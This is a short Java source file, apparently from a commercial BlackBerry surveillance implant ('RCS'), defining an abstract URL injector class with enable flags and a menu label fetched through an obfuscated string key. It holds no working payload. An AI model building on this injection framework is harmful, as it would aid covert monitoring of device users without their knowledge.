//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors.group;

import blackberry.Messages;
import blackberry.injection.injectors.AInjector;

public abstract class UrlGroupInjector extends AInjector {

    public boolean enabled() {
        return enabledGroup && enabled;
    }

    static boolean enabledGroup;

    static public boolean enabledGroup() {
        return enabledGroup;
    }

    static public void enableGroup(boolean value) {
        enabledGroup = value;
    }

    public String getPreferredMenuName() {
        //g.9=Yield
        return Messages.getString("g.9");
    }

}
